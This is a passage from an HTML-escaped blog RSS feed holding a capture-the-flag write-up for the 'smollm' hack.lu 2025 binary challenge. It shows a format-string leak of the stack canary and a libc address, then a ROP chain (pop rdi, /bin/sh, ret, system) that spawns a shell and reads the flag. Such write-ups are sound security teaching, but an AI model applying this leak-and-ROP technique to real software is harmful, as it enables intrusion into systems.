+&lt;p&gt;We can see an &amp;ldquo;invalide choice&amp;rdquo; message, as &lt;code&gt;add_token&lt;/code&gt; only reads 8 bytes, the &lt;code&gt;\n&lt;/code&gt; will be red after.&lt;/p&gt;
+&lt;p&gt;Now let&amp;rsquo;s try to print our token 32 time:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you want to
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Add a custom token
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Run a prompt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;How can I help you?
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;jihgfedcba&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;_^&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\[&lt;/span&gt;ZYXWVUTSRQPONMLK
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x200x210x200x6248b7acb3c00x636465666768696a0x5b5c5d5e5f6061620x535455565758595a0x4b4c4d4e4f5051520xa&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x20202020776f6e6b0x141d53f320319c000x7fff3701ce6f0x6248b7ac8474&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;0x32000000000000000x7025702570250a0x141d53f320319c00&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;0x7fff3701cfc80x7fff3701cf400x1&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;0x7a862a7211ca0x7fff3701cef00x7fff3701cfc80x1b7ac60400x6248b7ac83890x7fff3701cfc80xe36d61cfae476dae0x1&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;0x6248b7acad900x7a862a9430000xe36d61cfada76dae0xe99f5b2813c56dae0x7fff00000000&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;0x10x7fff3701cfc00x141d53f320319c000x7fff3701cfa00x7a862a72128b0x7fff3701cfd80x6248b7acad900x7fff3701cfd80x6248b7ac8389&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;0x6248b7ac80400x7fff3701cfc0&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;0x6248b7ac80650x7fff3701cfb80x380x10x7fff3701dfc8&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;0x7fff3701dfd9&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nil&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;0x210x7fff371530000x330xd300x100x178bfbff0x6know
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here because of the &lt;code&gt;\n&lt;/code&gt;, we already write out of the buffer.&lt;/p&gt;
+&lt;p&gt;All the &lt;code&gt;0x7025702570257025&lt;/code&gt; are our &lt;code&gt;%p&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;stack-overwrite&#34;&gt;Stack overwrite
+&lt;/h3&gt;&lt;p&gt;If we try to print 33 time our token:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;*** stack smashing detected ***: terminated
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We hit the canary&amp;hellip; But we leaked it earlier ! So we just have to do a first leak from a first run_prompt and then overwrite the canay with the value we got from the leak.&lt;/p&gt;
+&lt;p&gt;The stack like that:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ return address][ ??? ]&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rop&#34;&gt;ROP
+&lt;/h3&gt;&lt;p&gt;As we control the return address, we might be able to do a ROP ! But with &lt;strong&gt;PIE&lt;/strong&gt; and &lt;strong&gt;ASLR&lt;/strong&gt; on it seems complicated :/&lt;/p&gt;
+&lt;p&gt;Fortunatly an address of the libc is present in the stack&amp;rsquo;s leak (0x7a862a7211ca in the leak above).&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ return address ][ ??? ][ ... ][ libc address ]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;And &lt;strong&gt;system&lt;/strong&gt; and &lt;strong&gt;/bin/sh&lt;/strong&gt; are present in the provided libc :)&lt;/p&gt;
+&lt;p&gt;So we can create a shell !&lt;/p&gt;
+&lt;p&gt;We will overwrite the stack to get something like that:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ pop rdi ][ /bin/sh ][ system ]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;There is a last problem which I figure out but looking at &lt;code&gt;/tmp/core.smollm.&amp;lt;pid&amp;gt;&lt;/code&gt; file, when a program crashes it creates this file which you can analyse in gdb.
+And I saw the following error.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;0x7f753b65843b    movaps xmmword ptr [rsp + 0x50], xmm0     &amp;lt;[0x7ffd8e1025e8] not aligned to 16 bytes&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After looking at &lt;a class=&#34;link&#34; href=&#34;https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;some blog post&lt;/a&gt; I figure out that adding a ret gadget would do the job.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;[ buf + 1 ][ buf + x ][ buf + 256 ][ ??? ][ canary ][ ??? ][ pop rdi ][ /bin/sh ][ ret ][ system ]&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Tada !!&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat flag
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;w3_4re_ou7_0f_7ok3n5,sorry:171cec579a6ccf7ab7eba1b8cd2ee12c&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Feel free to read my &lt;a class=&#34;link&#34; href=&#34;http://localhost:1313/blog/files/hack.lu-2025/smollm/solve.py&#34; &gt;script&lt;/a&gt;, even if its a bit messy Xd.&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
